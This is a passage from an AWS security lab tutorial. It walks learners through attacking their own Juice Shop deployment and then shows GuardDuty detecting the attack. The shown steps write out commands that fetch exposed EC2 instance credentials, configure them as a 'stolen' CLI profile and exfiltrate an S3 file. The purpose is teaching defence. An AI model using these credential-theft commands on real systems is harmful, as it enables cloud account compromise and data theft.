> **💡 What are environment variables?**  
> Environment variables are like temporary storage spaces in your computer.
> 
> They let you store information, like website addresses or file names, that you can easily access later. This makes it easier to use the same information in different commands without having to type it out every time. It also helps keep your scripts safe by not storing sensitive information directly in the code.
> 
> For example, in this case, you can easily use the variable **JUICESHOPURL** the next time you'd like to enter the URL into a command.

-   Set the `JUICESHOPS3BUCKET` environment variable:
    
-   Make sure to replace `[TheSecureBucket]` with the `TheSecureBucket` value from your CloudFormation:
    



```bash
export JUICESHOPS3BUCKET="[TheSecureBucket]"
```

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_38.png)

  ![Screenshot 2025-05-03 163636](https://github.com/user-attachments/assets/c4f002e6-f7c0-4a63-8bc1-4b3dedfe628e)

> 🙋‍♀️ **I can't find the value for TheSecureBucket!**  
> Check your CloudFormation template's **Outputs** tab.
> 
> The value for **TheSecureBucket** should be in the final row.
> 
> ![](https://learn.nextwork.org/projects/static/aws-security-guardduty/thesecurebucket.png)
> 
>   

  
  

**Download and Display Credentials**

-   Run the following command to download your stolen credentials:
    



```bash
wget $JUICESHOPURL/assets/public/credentials.json
```

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_39.png)

 ![Screenshot 2025-05-03 163715](https://github.com/user-attachments/assets/53447dd4-abd8-4510-9daf-77b686ab8023)
 

> **💡 What does this code do?**  
> `wget` is a command-line tool used to download files from the internet.
> 
> In this case, we're using it to download the **credentials.json** file from our web app and into the CloudShell environment. This means there's now a local file in CloudShell that contains the stolen credentaisl!
> 
> Notice how we're using `$JUICESHOPURL` in the command. That's our environment variable at work - it's automatically pulling the JUICESHOPURL you've saved previously, and using it in the command so you don't have to type it out yourself.

-   Display the credentials:
    



```bash
cat credentials.json | jq
```

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_40.png)

 ![Screenshot 2025-05-03 163742](https://github.com/user-attachments/assets/3c46ffa5-9536-4304-82c9-add1f8a221e2) 

> **💡 What do those code blocks do?**  
> `cat` is used to display what's inside a file, while `jq` is used to process JSON data.
> 
> In this case, we're using both commands to tell CloudShell to display what's inside **credentials.json**, but use jq to process the JSON data inside to make it easier to read.
> 
>   
> **💡 What is the response I'm seeing in the terminal?**  
> You're seeing what's inside the **credentials.json** file, which are the credentials we stole through the web app!



**Configure AWS CLI Profile**

-   Configure an AWS CLI profile named **stolen** using the downloaded credentials:
    



```bash
aws configure set profile.stolen.region us-west-2
aws configure set profile.stolen.aws_access_key_id `cat credentials.json | jq -r '.AccessKeyId'`
aws configure set profile.stolen.aws_secret_access_key `cat credentials.json | jq -r '.SecretAccessKey'`
aws configure set profile.stolen.aws_session_token `cat credentials.json | jq -r '.Token'`
```

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_42.png)

![Screenshot 2025-05-03 164106](https://github.com/user-attachments/assets/3688de8a-5bd8-4fc5-8096-34dbe8684668)  

> **💡 What is an AWS CLI profile?**  
> In AWS, a **profile** are settings and credentials you use to authenticate and access AWS services.
> 
> Each profile is made up of authentication information like your AWS access key, secret key, session token, and the AWS region you're working in.
> 
> You can have lots of different profiles stored on your computer or in an environment like AWS CloudShell, each configured for different accounts or permissions.
> 
>   
> **💡 What is the current profile in CloudShell?**  
> By default, AWS CloudShell uses a profile that takes all the permissions granted to the user you're logged into in the Management Console.
> 
>   
> **💡 Why are we creating a new profile in CloudShell?**  
> We're creating a new profile in CloudShell, called **stolen**, to use the stolen credentials we've extracted from our attack on the web application.
> 
> This lets us 'hack into' our AWS environment, and we'll have to see whether GuardDuty can pick up on the sneaky things we're about to do as a hacker...
> 
> 🚨 Note: Make sure your AWS CloudShell terminal session stays open for the rest of this step, as we will reuse these credentials later!



  
  

**Copy the Secret File**

-   Using the stolen credentials, copy the "secret-information.txt" file from the S3 bucket:
    



```bash
aws s3 cp s3://$JUICESHOPS3BUCKET/secret-information.txt . --profile stolen

```

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_43.png)

![Screenshot 2025-05-03 164250](https://github.com/user-attachments/assets/92b54c41-68e0-458b-9c9f-0faf1795e603)  

> **💡 What have you done as the attacker?**  
> As the attacker (i.e. using the profile called **stolen**), you've just gained access to sensitive data stored in an S3 bucket. You've also just made a copy of the file and saved it in the CloudShell environment.
> 
> In the real world, this could lead to data breaches, financial losses, and damages to a company's reputation.

  
  

**View the Secret File**

-   Check out the contents of your downloaded file:
    



```bash
cat secret-information.txt

```
![Screenshot 2025-05-03 164348](https://github.com/user-attachments/assets/6ba84b9e-2e8a-409c-9df0-555471cb4ffa)

-   You should see a line of text that reads **Dang it - if you can see this text, you're accessing our private information!**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_44.png)

  
![Screenshot 2025-05-03 164322](https://github.com/user-attachments/assets/08252107-a853-4469-8cd3-bcae0a953477)
  
Woah!! Just like that, you've gotten access to the company's secret information.



Let's recap what you've done as the hacker:

1.  Visited the **Juice Shop** web app.
    
2.  Used **SQL injection** to bypass logging into the web app's admin portal.
    
3.  Used **command injection** to make the web server (i.e. the EC2 instance hosting the web app) create a new file. The new file contains the server's credentials to an AWS environment.
    
4.  Visited the new file, which is in a **publicly accessible** part of the web app. This means anyone can visit the file's URL and see the exposed credentials too.
    
5.  Ran commands to retrieve the exposed credentials from the web app and save a copy in your local **CloudShell** environment.
    
6.  Set up a new **profile** in CloudShell using the exposed credentials your saved. This gave you, the hacker, access to your victim's AWS environment.
    
7.  Used the new profile to **access an S3 bucket** in the victim's AWS environment.
    
8.  Opened and **read the contents of a file** in the S3 bucket. The victim's private information is leaked!
    
-----
## 🛡️ Step #5

### Detect the Attack with GuardDuty

  

Wooo, that's the attack on the web app host all complete!

Now, we're going to say goodbye to 👋 hacker mode 👋 and step back into the role of the web app host.

As the engineer that deployed this web app, let's see whether GuardDuty detected the malicious activity from the attacker.

  
  

**In this step, you're going to:**

-   Find and analyze GuardDuty's findings.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-6.0.png)

  



  
  

**Locate GuardDuty's Findings**

-   Navigate to the `GuardDuty` console.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_45.png)

  ![Screenshot 2025-05-03 164634](https://github.com/user-attachments/assets/5a3c3a75-bc22-44bb-83da-40deb873b85e)

-   Woah! You should see the GuardDuty dashboard showing `1` finding.

    ![Screenshot 2025-05-03 164812](https://github.com/user-attachments/assets/3a41b196-f7ef-4c1d-a564-54426be500e6)


![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_46.png)

  ![Screenshot 2025-05-03 164822](https://github.com/user-attachments/assets/345b0f53-da61-45c1-b519-6272f8d45e05)

> 🙋‍♀️ **I don't see any findings yet**  
> GuardDuty can take up to 15 minutes to detect that something suspicious has happened.
> 
> 
>   
> 💡 **What is a finding?**  
> A GuardDuty **finding** is a notification that something suspicious has happened in your AWS environment.
> 
> The finding tells you what happened, who did it, and how they did it. This helps you understand the attack and fix the problem.



-   Click into the **Findings** option from the left hand navigation panel.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_47.png)

  

-   Spot the finding, which should have **High** severity.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_48.png)

 ![Screenshot 2025-05-03 164937](https://github.com/user-attachments/assets/39879953-99a7-4247-b994-d1baf68f1f15) 

> **💡 What does severity mean?**  
> Severity is a measure of how serious a security threat is.
> 
> A higher severity means the threat is more dangerous and needs to be addressed quickly. A lower severity score means the threat is less dangerous and can be addressed later.

-   Click into the finding's title to see the juicy details.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_48.png)

  



> 💡 **What did GuardDuty find?**  
> Aha! GuardDuty detected something _very_ suspicious. The security credentials you gave to an EC2 instance (i.e. the web app server) is being used by another AWS account!
> 
> As a reminder, CloudShell runs in a temporary account **separate** from your own AWS account. So, using CloudShell running commands using the **stolen** profile is definitely unusual to GuardDuty. Only one thing should be able to use those credentials, and it's the web server - _not_ a profile from another AWS account.
> 
> ![](https://learn.nextwork.org/projects/static/aws-security-guardduty/unprocessed_image_50.png)
> 
>   
> 
> Because of this, GuardDuty triggers the finding **UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS**
> 
> Let's break it down:
> 
> -   **UnauthorizedAccess** means some someone tried to do something they shouldn’t have the rights to within your AWS environment.
>     
> -   **IAMUser/InstanceCredentialExfiltration** is the unauthorized activity that GuardDuty detected. Credentials assigned to an EC2 instance (i.e. web server of your web app) were used in a suspicious way, so it's likely that they were stolen. This data breach is called **exfiltration**.
>     
> -   **InsideAWS** tells us that the unauthorized access happened within AWS, but by a different AWS account to yours.
>     
> 
>   
> 💡 **How did GuardDuty pick up on this?**  
> GuardDuty uses advanced machine learning algorithms to always monitor and analyze your account's activity.
> 
> In this case, there would've been an **anomaly detection** algorithm, which means an algorithm that picked up on an unsual use of your EC2 instance's credentials. GuardDuty would compare this activity against the instance's typical use of its AWS account credentials, and decide that copying an S3 bucket object is out of the ordinary.



  
  

**Analyze the Finding**

-   Scroll through the details of this finding.
  
  ![Screenshot 2025-05-03 165048](https://github.com/user-attachments/assets/d2d72283-3a09-434c-a797-4afbc168dbcc)
![Screenshot 2025-05-03 165350](https://github.com/user-attachments/assets/fb2674dc-d5d3-45b9-be07-5863cb531f0d)
![Screenshot 2025-05-03 165401](https://github.com/user-attachments/assets/60a3e5a7-04b3-49d9-bab1-639933ffc55a)
![Screenshot 2025-05-03 165410](https://github.com/user-attachments/assets/ec8dc228-944c-47fd-ab83-f2ce9976945e) 
    

> **💡 What information does the finding give us about the attack?**  
> The finding provides gives you all the juicy details about the unauthorized access, including...
> 
> -   The **Resource affected**, which tells you the attack used an IAM role to access your juice shop's S3 bucket.
>     
> -   The **Action**, which tells you that an object (i.e. the important information text file) was retrieved.
>     
> -   The **Location** and **IP address** of the attacker, which would be a location in your AWS Region at the time of using CloudShell.
>     
> 
>   
> This information is so helpful for analyzing the source of an attack, who the attacker could've been, whether there are threats to anticipate now based on what they retrieved, and how to prevent similar breaches in the future.



 Awesome job taking up this project on threat detection.

As both the hacker and defender in today's project, you've levelled up your skills in security vulnerabilities in web apps _and_ how to protect against them.

-----
## 💎 Secret Mission

### Use S3 Malware Protection

  

Welcome to your 🤫 exclusive 🤫 secret mission!

Your mission, should you choose to accept it, is to level up your GuardDuty skills using **Malware Protection.**

  
  

**💎 In this secret mission, get ready to:**

-   Enable malware protection in GuardDuty.
    
-   Upload a test malware file to the S3 bucket.
    
-   Verify GuardDuty's findings.
    
-   Showcase more advanced knowledge, like **malware protection** and **malware test files**, in your **project documentation.** Stand out from the rest!
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/secret-mission.png)

  

> 💎 **Congratulations** - Secret Mission unlocked!



  
  

**Enable Malware Protection**

-   In the `GuardDuty` console, 
    ![Screenshot 2025-05-03 165905](https://github.com/user-attachments/assets/f2659247-d7eb-481a-9138-ca7dbbb0238a)

- select **Malware Protection for S3** from the left hand navigation panel.

![Screenshot 2025-05-03 165920](https://github.com/user-attachments/assets/45fe762e-d260-42b9-a04b-5de4f6184204)

> 💡 **What is malware?**  
> Malware is a type of software designed to harm computers.
> 
> It can damage computers, steal data, or disrupt operations. GuardDuty helps to protect AWS resources by detecting and preventing you from using malware in your environment.

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_51.png)

  

-   Select **Enable** to start using **Malware Protection.**
    
![Screenshot 2025-05-03 170011](https://github.com/user-attachments/assets/f6ba28db-1fba-4743-9176-c394be2ba1b4)

> Note: The Free Tier for Malware Protection for S3 is changing! [Find out more here](https://docs.aws.amazon.com/guardduty/latest/ug/pricing-malware-protection-for-s3-guardduty.html)
> 
> If you are doing this project **before** **June 11, 2025** - Malware Protection is free for your account, until June 15, 2025.
> 
> If you are doing this project **after** **June 11, 2025** - Malware Protection is free for accounts under 12 months old. If you've been using your AWS account for more than a year, please note that you will be charged for using Malware Protection unless you create a new AWS Account!

-   In the **S3 bucket details** panel, select **Browse S3.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_53.png)

  

-   Search for your S3 bucket, the name should start with `guardduty-project`
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_54.png)

![Screenshot 2025-05-03 170104](https://github.com/user-attachments/assets/67df8342-baf1-4e2f-aa85-9507894b809b)
  

-   Select **Select.**
    
-   We'll leave the default settings for **Tag scanned objects** and **Service access.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_56.png)

  ![Screenshot 2025-05-03 170217](https://github.com/user-attachments/assets/184fd6fb-da56-4959-aafa-bf8226c1ec27)


> **💡 Extra for PROs: What does Tag scanned objects mean?**  
> The **Tag scanned objects** setting is about labeling your scanned files automatically based on the outcome of their malware scans.
> 
> These tags include statuses like **NO_THREATS_FOUND, THREATS_FOUND, ACCESS_DENIED, or FAILED.** Automatic tagging is so useful for quickly identifying the security status of files at a glance without needing to dig through logs or findings.
> 
> You can also set up **automations** based on these tags, like automatically moving malware to another bucket to protect your resources.
> 
> Note: Tagging scanned objects is _not_ Free Tier eligible, which is why we're not using this setting.
> 
>   
> **💡 Extra for PROs: What does Service access mean?**  
> The **Service access** setting is all about the permissions that GuardDuty needs to run malware scans on your behalf.
> 
> This role must have the necessary permissions to access your S3 objects and perform scans. By selecting **Create and use a new service role**, you're letting AWS set up the role for you. No need for us to set it up separately!

-   Scroll to the bottom of the page, and select **Enable.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_57.png)

  

![Screenshot 2025-05-03 170233](https://github.com/user-attachments/assets/e33ff227-cb2c-4def-ab08-84852b793e91)

-   Great! Once it's done enabling, you should see a green success banner at the top of the screen that you've **Successfully enabled Malware Protection for S3.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_59.png)

  
![Screenshot 2025-05-03 170501](https://github.com/user-attachments/assets/1da3fb51-cc32-4a81-bea1-25902ae10ea5)


  
  

**Upload Malware File**

To see if the Malware Protection works, we're going to need to give it a file that it should detect.

-   From the **Protected buckets** panel, select your S3 bucket.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_60.png)

![Screenshot 2025-05-03 170527](https://github.com/user-attachments/assets/dec8a175-cc9e-47cf-ac9c-6267e7128891)  

-   Great! You're now at Malware Protection's dedicated page for this bucket, showing you CloudWatch metrics as a summary of files that were scanned and any malware detected.
    
-   Select your S3 bucket's name again. 

![Screenshot 2025-05-03 171441](https://github.com/user-attachments/assets/54b93efd-5fee-43af-b5af-4a53ba784aae)


- This is a shortcut to get into your S3 bucket.

![Screenshot 2025-05-03 171504](https://github.com/user-attachments/assets/39249491-c90a-4c44-abf7-370fee2134bf)




    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_61.png)

  ![Screenshot 2025-05-03 170615](https://github.com/user-attachments/assets/731dd6db-dde1-4c28-8fab-7424307774eb)

> 💡 **What is Malware Protection Resource?**  
> **Malware Protection Resources** are features features for detecting malware threats in GuardDuty.
> 
> This includes scanning files for malware signatures, monitoring access patterns for any suspicious activity, and providing alerts and recommendations for dealing with detected threats.

-   Download this file called an EICAR test file:
    
    -   Right click on the link below, and select **Save link as...**
        
    -   [EICAR-test-file.txt](https://storage.googleapis.com/nextwork_course_resources/courses/aws/AWS%20Project%20People%20projects/Project%3A%20Threat%20Detection%20with%20Amazon%20GuardDuty/EICAR-test-file.txt)
        

> 💡 **What's an EICAR test file?**  
> An EICAR test file is a harmless file that is programmed to make antivirus software _think_ it's malware.
> 
> It's like a fake virus that helps test if your antivirus software is working properly without actually using a real virus. In our case, we're using the test file to verify whether GuardDuty can detect malware.
> 
> **Tip:** In case you were wondering, EICAR stands for the company that developed it - the European Institute for Computer Antivirus Research (EICAR).

-   Select **Upload**.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_62.png)

  
![Screenshot 2025-05-03 171540](https://github.com/user-attachments/assets/e634df1d-c50e-4621-bfe0-08e22edf9324)

-   Select **Add files.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_63.png)

  ![Screenshot 2025-05-03 171550](https://github.com/user-attachments/assets/7a13bb50-4f12-4fef-b139-0576417c42c2)

-   Select your EICAR test file in your **Downloads** folder.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_64.png)

  ![Screenshot 2025-05-03 172154](https://github.com/user-attachments/assets/521235d4-0e7d-4528-b5f8-988fdaf6fc2f)

-   Select **Upload.**
    
-   Upload success!
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_65.png)

 ![Screenshot 2025-05-03 172206](https://github.com/user-attachments/assets/a0d7c6a8-7f64-4623-abac-5d3098838e4c)
 

Ooo good one, you've just uploaded malware into your S3 bucket (a test one, of course)!



Sneaky... let's see if GuardDuty catches on.

  
  

**Check for Findings**

-   Head back to the `GuardDuty` console.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_66.png)

  ![Screenshot 2025-05-03 172345](https://github.com/user-attachments/assets/e74fa614-63de-4ce0-9f19-ab289bc2cdb2)

-   Select the **View findings** option.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_67.png)

  ![Screenshot 2025-05-03 172337](https://github.com/user-attachments/assets/d9535c13-9284-437e-bf56-2f14e5abeda4)


-   Woah! GuardDuty does pick up on it after all.
    

  
  

This time, the finding type is **Object:S3/MaliciousFile**. Great catch from GuardDuty!

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_68.png)

  

-   You can even click on the small **info** button to read a simplified description of GuardDuty's warning.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_75.png)

 ![Screenshot 2025-05-03 172354](https://github.com/user-attachments/assets/ee27ea20-44fa-4d09-899d-0e7695f48943) 


------
  

## 🗑️ Before you go

### Delete your resources

  

Now that we've explored the web app and GuardDuty, it's time to clean up the resources we created. This is so important to avoid incurring unnecessary costs.

  
  

**Resources to delete:**

Delete the CloudFormation stack.

Delete the CloudFormation template from S3.

Delete **credentials.json** and **secret-information.txt** in CloudShell.

Delete files saved in your local computer.

  
  

✋ **STOP**

Before diving into the steps for deleting your resources, why not challenge yourself to delete everything in this project on your own?

Keeping track of your resources, and deleting them at the end, is absolutely a skill that will help you reduce waste in your account.

  
  

🛑 **STEPS BELOW:**

**Delete the CloudFormation Stack**

-   Head to the `CloudFormation` console.
    
-   Select the stack you deployed to create your web app. Its name should start with `NextWork-GuardDuty-project-`
    
-   Select **Delete**.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_69.png)

  

-   Select **Delete** on the pop up window.

![Screenshot 2025-05-03 174051](https://github.com/user-attachments/assets/9e26b6a1-9fa2-449b-b729-13d0cf4c38f8)
    
-   CloudFormation will start to delete all the resources it's deployed. This can take up to 10 minutes, so we'll come back to it later!
    

  
  

**Delete the CloudFormation Template**

-   Head to the `S3` console.
    
-   You might notice that you have a bucket starting with `cf-templates-`!
    
-   This is a bucket that CloudFormation automatically created. It stores the template you used to create your CloudFormation stack.
    
-   Since we don't need the template anymore, let's delete the bucket too. Click into the bucket.
    
-   Select all objects.
    
-   Select **Delete**.

![Screenshot 2025-05-03 174604](https://github.com/user-attachments/assets/8841a876-2ae8-466a-a744-18aadbc06a9d)

    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_76.png)

  

-   Type `permanently delete`

![Screenshot 2025-05-03 174709](https://github.com/user-attachments/assets/0ec855fa-4ab7-471c-95bc-1b88edbaae53)

    
-   Select **Delete objects**.

![Screenshot 2025-05-03 174719](https://github.com/user-attachments/assets/f78ae184-13a1-4968-9b1b-7fde693cbbde)


    
-   Next, select **General purpose buckets** from the left hand navigation panel.
    
-   This time, we can select the bucket.
    
-   Select **Delete**.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_78.png)

  

-   Enter your bucket's name.
    
-   Select **Delete bucket.**
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_79.png)

  
![Screenshot 2025-05-03 174745](https://github.com/user-attachments/assets/ced9124a-d58c-46ab-8e9e-c4533312085d)


  
  

Nice work deleting the CloudFormation templates too.

  ![Screenshot 2025-05-03 174755](https://github.com/user-attachments/assets/49b776c6-cd89-42ec-82e4-aad535ecbf01)

![Screenshot 2025-05-03 174925](https://github.com/user-attachments/assets/c3cff1d5-9d61-4379-8138-e0741bda9a52)

  ![Screenshot 2025-05-03 174934](https://github.com/user-attachments/assets/fa0be425-434e-4c7e-b337-3e586bfc8820)

![Screenshot 2025-05-03 175058](https://github.com/user-attachments/assets/f42c47bc-69a1-4d59-99a4-abb7eb9cfba9)

![Screenshot 2025-05-03 175112](https://github.com/user-attachments/assets/f84b86d6-3755-4650-9dd7-b6ea69762b8e)

![Screenshot 2025-05-03 175222](https://github.com/user-attachments/assets/b53b0be5-6d08-4fe7-9aa5-171f58624d43)



Delete **credentials.json** and **secret-information.txt**

-   From your **CloudShell** console, we can delete the sensitive information we copied.
    
-   Open your **CloudShell** terminal.
    
-   Run `ls` to see what files are still left in CloudShell.
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_71.png)

  

-   Run `rm secret-information.txt` to delete the information you extracted.
    
-   Run `rm credentials.json` to delete the credentials file you've created.
    
-   Run `ls` again - you should see no files are left in CloudShell!
    

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/processed_image_72.png)

  ![Screenshot 2025-05-03 175606](https://github.com/user-attachments/assets/9b1577b9-ad8f-4735-b8b1-abe01ea06a8c)

> 🙋‍♀️ **I have lots of other files left in my CloudShell environment**  
> 
> ![](https://learn.nextwork.org/projects/static/aws-security-guardduty/cloudshell-other-files.png)
> 
> These files might belong to other projects that used CloudShell! They probably don't belong to this project.
> 
> To remove all files from your CloudShell environment, you can use the following command:
> 

> 
> ```bash
> rm -rf *
> 
> ```

  ![Screenshot 2025-05-03 181242](https://github.com/user-attachments/assets/88878d1b-14bf-4fe7-86fb-48ed05511670)

  ![Screenshot 2025-05-03 181322](https://github.com/user-attachments/assets/f0a7cab7-86e2-48d7-b118-9e84b1ce4409)

**Delete files saved in your local computer**

-   In your local machine's **Downloads** folder, you can delete your CloudFormation template.
    
-   Finally, in your local machine's **Downloads** folder, you can delete your **EICAR-test-file.txt**

------
  
## 🎉 Mission Accomplished

### That's a wrap!

  

Woohoo! Well done completing this project on threat detection with AI!

You're now a certified Juice Shop hacker (the ethical kind, of course) 🧃

![](https://learn.nextwork.org/projects/static/aws-security-guardduty/architecture-complete.png)

  

**You've learned how to:**

-   🛍️ Deploy a web app using CloudFormation.
    
-   😈 Use SQL injection and arbitrary code execution to expose a web app.
    
-   🥷 Steal credentials and sensitive data.
    
-   🕵️‍♂️ Detect attacks using GuardDuty.
    
-   💎 Use malware protection to level up your GuardDuty skills.

----

content owner : **Nextwork**
------
    


